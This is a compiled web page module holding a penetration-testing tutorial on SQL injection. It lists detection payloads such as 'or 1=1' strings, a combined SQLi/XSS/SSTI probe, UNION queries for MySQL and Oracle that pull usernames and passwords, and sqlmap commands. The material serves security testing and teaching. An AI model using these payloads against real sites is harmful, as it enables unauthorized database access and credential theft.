import{_ as r,c as o,a5 as n,G as e,w as i,B as l,o as h,j as s}from"./chunks/framework.B5CpDqM0.js";const F=JSON.parse('{"title":"SQL injection","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"web/inputs/sqli.md","filePath":"web/inputs/sqli.md","lastUpdated":1724982529000}'),c={name:"web/inputs/sqli.md"};function d(k,a,u,g,b,m){const t=l("PluginTabsTab"),p=l("PluginTabs");return h(),o("div",null,[a[2]||(a[2]=n(`<h1 id="sql-injection" tabindex="-1">SQL injection <a class="header-anchor" href="#sql-injection" aria-label="Permalink to &quot;SQL injection&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>Many web applications use one or multiple databases to manage data. In order to dynamically edit the database while users browse the website, some SQL queries can rely on input vectors. When input parameters used in those queries are insufficiently validated or sanitized, these web apps can be vulnerable to SQL injections.</p><p>SQL injection attacks can allow attackers to read, update, insert or delete database data by injecting a piece of SQL query through the input vector, hence affecting the intended execution of the original query. In some cases, these attacks can also lead to File Download, File Upload or even Remote Code Execution.</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><p>Testers need to identify input vectors (parts of the app that accept content from the users) that could be used for database operations. For each identified vector, testers need to check if malicious strings and values successfully exploit any vulnerability.</p><h3 id="vulnerable-input-recon" tabindex="-1">Vulnerable input recon <a class="header-anchor" href="#vulnerable-input-recon" aria-label="Permalink to &quot;Vulnerable input recon&quot;">​</a></h3><p>Using special SQL characters (<code>&#39;</code>, <code>&quot;</code>, <code>#</code>, <code>;</code>, <code>)</code>, <code>*</code>,<code>%</code>) in an input could lead to SQL errors sometimes echoed back to the users for debugging. This would indicate an entry point not sanitized enough and thus potentially vulnerable to SQL injection.</p><div class="tip custom-block"><p>For every payload do not forget to try url encoding or others.</p></div><h3 id="manual-testing" tabindex="-1">Manual testing <a class="header-anchor" href="#manual-testing" aria-label="Permalink to &quot;Manual testing&quot;">​</a></h3><p>With <code>some.website/?parameter=value</code> some basic useful payload to detect vulnerable inputs are:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>parameter=1</span></span>
<span class="line"><span>parameter=1&#39;</span></span>
<span class="line"><span>parameter=1&quot;</span></span>
<span class="line"><span>parameter=[1]</span></span>
<span class="line"><span>parameter[]=1</span></span>
<span class="line"><span>parameter=1\`</span></span>
<span class="line"><span>parameter=1\\</span></span>
<span class="line"><span>parameter=1/**/</span></span>
<span class="line"><span>parameter=1/*!111&#39;*/</span></span>
<span class="line"><span>parameter=1&#39; or &#39;1&#39;=&#39;1</span></span>
<span class="line"><span>parameter=1 or 1=1</span></span>
<span class="line"><span>parameter=&#39; or &#39;&#39;=&#39;</span></span>
<span class="line"><span>parameter=&#39; OR 1 -- -</span></span>
<span class="line"><span>parameter=1&#39; or 1=1 --</span></span>
<span class="line"><span>parameter=1&#39; or 1=1 -- -</span></span>
<span class="line"><span>parameter=1&#39; or 1=1 /*</span></span>
<span class="line"><span>parameter=&#39;=&#39;</span></span></code></pre></div><div class="warning custom-block"><p>GET parameters are not the only ones that could be vulnerable to SQLi. Testers should thoroughly test all user inputs (parameters, user-agents, cookies...)</p></div><p>The following payload is used for testing SQL injections, <a href="./xss">XSS (Cross-Site Scripting)</a> and <a href="./ssti">SSTI (Server-Side Template Injection)</a>.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>&#39;&quot;&lt;svg/onload=prompt(5);&gt;{{7*7}}</span></span></code></pre></div><h4 id="extracting-information-with-union" tabindex="-1">Extracting information with UNION <a class="header-anchor" href="#extracting-information-with-union" aria-label="Permalink to &quot;Extracting information with UNION&quot;">​</a></h4>`,16)),e(p,null,{default:i(()=>[e(t,{label:"MySQL"},{default:i(()=>a[0]||(a[0]=[s("p",null,"1. Finding number of columns:",-1),s("div",{class:"language-sql vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"sql"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"' ORDER BY 2 -- # iterate until error to find number of columns")])])])],-1),s("p",null,"2. Extract database information:",-1),s("div",{class:"language-sql vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"sql"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"' UNION SELECT @@version, NULL -- # Inserting null depending on number of columns")])])])],-1),s("p",null,"3. Find tables name:",-1),s("div",{class:"language-sql vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"sql"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"' UNION SELECT NULL,concat(COLUMN_NAME) from information_schema.columns where table_name='"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"users"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"' --")])])])],-1),s("p",null,"4. Retrieve information from table:",-1),s("div",{class:"language-sql vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"sql"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"' UNION SELECT username,password from users --")])])])],-1)])),_:1}),e(t,{label:"Oracle"},{default:i(()=>a[1]||(a[1]=[s("p",null,"1. Finding number of columns:",-1),s("div",{class:"language-sql vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"sql"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"' ORDER BY 2 -- # iterate until error to find number of columns")])])])],-1),s("p",null,"2. Extract database information:",-1),s("div",{class:"language-sql vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"sql"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"' UNION SELECT banner,NULL from v$version --")])])])],-1),s("p",null,"3. Find tables name:",-1),s("div",{class:"language-sql vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"sql"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"' UNION SELECT table_name,NULL from all_tables --")])])])],-1),s("p",null,"4. Retrieve information from table:",-1),s("div",{class:"language-sql vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"sql"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"' UNION SELECT username,password from users --")])])])],-1)])),_:1})]),_:1}),a[3]||(a[3]=n(`<h3 id="automated-tests" tabindex="-1">Automated tests <a class="header-anchor" href="#automated-tests" aria-label="Permalink to &quot;Automated tests&quot;">​</a></h3><p>Tools like <a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noreferrer">SQLmap</a> (Python) or <a href="https://github.com/xxgrunge/sqlninja" target="_blank" rel="noreferrer">SQLninja</a> (Perl) can also be used to fuzz input vectors, find vulnerable entry points and automatically exploit them.</p><div class="caution custom-block"><p>Just like any fuzzing tool, these scans need to be slowed down when testing production instances as it could lead to an unintended denial of service. In addition to that, testers need to use those tools with the greatest care since creating issues with production instances databases (like overwriting or deleting data) could have a serious fallout.</p></div><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --user-agent</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;PENTEST&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --url</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $URL </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> target_parameter</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --all</span></span></code></pre></div><p>It is also possible to load request files and let SQLmap do the heavy work of fuzzing every parameter and input vector.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -r</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $REQUEST_FILE </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">--level</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -v</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --all</span></span></code></pre></div><p>The request file should look like a standard HTTP request (line, headers, empty line, optional data). It can be obtained by many ways like inspecting network operations in a browser, intercepting requests with a proxy (like Burp Suite), and so on.</p><div class="language-http vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">http</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">POST</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /login.php </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">HTTP</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1.1</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Host</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> www.target.com</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">User-Agent</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Accept</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Accept-Language</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> en-US,en;q=0.8,fr;q=0.5,fr-FR;q=0.3</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Accept-Encoding</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> gzip, deflate, br</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Content-Type</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> application/x-www-form-urlencoded</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Content-Length</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 43</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Cookie</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> JSESSIONID=F168EA13C46D14AA134E13D4;</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Connection</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> keep-alive</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Upgrade-Insecure-Requests</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">username=testusername&amp;password=testpassword</span></span></code></pre></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://www.asafety.fr/mysql-injection-cheat-sheet/" target="_blank" rel="noreferrer">https://www.asafety.fr/mysql-injection-cheat-sheet/</a></p><p><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank" rel="noreferrer">https://owasp.org/www-community/attacks/SQL_Injection</a></p><p><a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noreferrer">https://portswigger.net/web-security/sql-injection</a></p><p><a href="http://pentestmonkey.net/category/cheat-sheet/sql-injection" target="_blank" rel="noreferrer">http://pentestmonkey.net/category/cheat-sheet/sql-injection</a> SQL injection cheatsheets (MSSQL, MySQL, Oracle SQL, Postgres SQL, ...)</p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank" rel="noreferrer">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</a></p><p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noreferrer">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p><p><a href="https://portswigger.net/kb/issues/00100210_sql-injection-second-order" target="_blank" rel="noreferrer">https://portswigger.net/kb/issues/00100210_sql-injection-second-order</a></p><p><a href="https://github.com/Hakumarachi/Loose-Compare-Tables" target="_blank" rel="noreferrer">https://github.com/Hakumarachi/Loose-Compare-Tables</a></p>`,17))])}const v=r(c,[["render",d]]);export{F as __pageData,v as default};
